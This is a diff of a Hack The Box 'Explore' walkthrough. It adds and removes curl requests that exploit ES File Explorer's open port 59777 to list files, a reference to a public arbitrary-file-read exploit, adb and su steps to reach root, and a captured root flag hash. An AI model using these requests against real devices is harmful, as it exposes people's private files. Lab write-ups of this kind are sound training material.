@@ -133,7 +133,9 @@ curl --header "Content-Type: application/json" --request POST --data "{\"command
 ....
 
 curl — header “Content-Type: application/json” — request POST — data ‘{“command”:”listFiles”}’ http://explore.htb:59777/sdcard/DCIM
-
+..
+cred.jpg
+...
 
 or searchsploit es file explore
 Exploit Title                                                                  |  Path
@@ -201,9 +203,6 @@ netstat -tulpn
 https://packetstormsecurity.com/files/163303/ES-File-Explorer-4.1.9.7.4-Arbitrary-File-Read.html
 
 
-curl --header "Content-Type: application/json" --request POST --data "{\"command\":\"listFiles\"}" http://explore.htb:59777
-curl --header "Content-Type: application/json" --request POST --data "{\"command\":\"listFiles\"}" http://explore.htb:59777/sdcard
-
 on my machine
 apt-get install android-tools-adb
 
@@ -222,6 +221,7 @@ x86_64:/ $ su
 # whoami
 root
 # find / -name root.txt 2>/dev/null
+#find / -user "root" -type f -name "root.txt" 2>/dev/null
 /data/root.txt
 f04fc82b6d49b41c9b08982be59338c5
 
